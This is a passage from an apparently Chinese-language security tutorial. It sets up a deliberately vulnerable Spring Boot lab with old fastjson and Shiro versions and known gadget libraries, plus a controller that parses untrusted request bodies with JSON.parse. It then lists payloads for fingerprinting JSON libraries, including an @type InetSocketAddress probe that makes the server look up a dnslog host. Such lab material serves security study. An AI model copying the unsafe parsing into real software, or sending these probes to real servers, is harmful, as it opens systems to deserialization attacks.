class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>jar<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.shiro.vuln<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ShiroAndFastJson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ShiroAndFastJson<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.68<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-spring<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.0.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-io/commons-io --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.19<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjtools --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/mchange-commons-java --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mchange-commons-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.2.11<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/io.lettuce/lettuce-core --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.lettuce<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lettuce-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.6.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.rhq/rhq-scripting-python --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.rhq<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rhq-scripting-python<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.codehaus.groovy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>groovy<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-codec/commons-codec --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-codec<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-codec<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/ognl/ognl --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ognl<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ognl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/xalan/xalan --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>xalan<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xalan<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.dom4j/dom4j --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.dom4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dom4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><br><br><br><br><br><br><br><br><br><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.*<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.*<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>控制器 src&#x2F;main&#x2F;java&#x2F;com&#x2F;shiro&#x2F;vuln&#x2F;controller&#x2F;IndexController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();    <span class="hljs-comment">//创建实例。用于创建和操作JSON对象</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>            jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));  <span class="hljs-comment">//解析传入的字符串</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>            jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>        &#125;<br>        <span class="hljs-keyword">return</span> jsonObject;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断Json库</p><p><strong>dnslog判断</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rtpmognpiy.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240423132316655.png" alt="image-20240423132316655"></p><p><img src="image-20240423132339712.png" alt="image-20240423132339712"></p><p><strong>解析判断</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ext&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;blue&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.ext&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>定义一个属性，读取属性的值，从来产生回显</p><p><img src="image-20240423133259552.png" alt="image-20240423133259552"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;whatever&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="image-20240423133036383.png" alt="image-20240423133036383"></p><h5 id="jsckson"><a href="#jsckson" class="headerlink" title="jsckson"></a>jsckson</h5><p><strong>浮点类型精度丢失判断</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.1111111111111111111111111111111111111111111111111111111111111</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果返回结果是1.1111111111111111112，那么就是jackson，fastjson会丢失精度</p><p>fastjson</p><p><img src="image-20240423141426288.png" alt="image-20240423141426288"></p><p><strong>注释符判断</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-comment">/*#W01fh4cker   </span><br></code></pre></td></tr></table></figure><p>后面<code>/*</code>被注释了，所以能解析成功，为jackson</p><p><strong>单引号判断发</strong></p><p>正常传参</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>改为单引号：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> &#x27;admin&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> &#x27;admin&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>jackson报错，fastjson不报错</p><p><strong>多余类成员判断</strong></p><p>正常</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>如果报错就是jsckson</p><p><strong>gson</strong></p><p>注释符判断</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">#\r\n<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;score&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1.1</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>回显正常</p><p><strong>org.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span 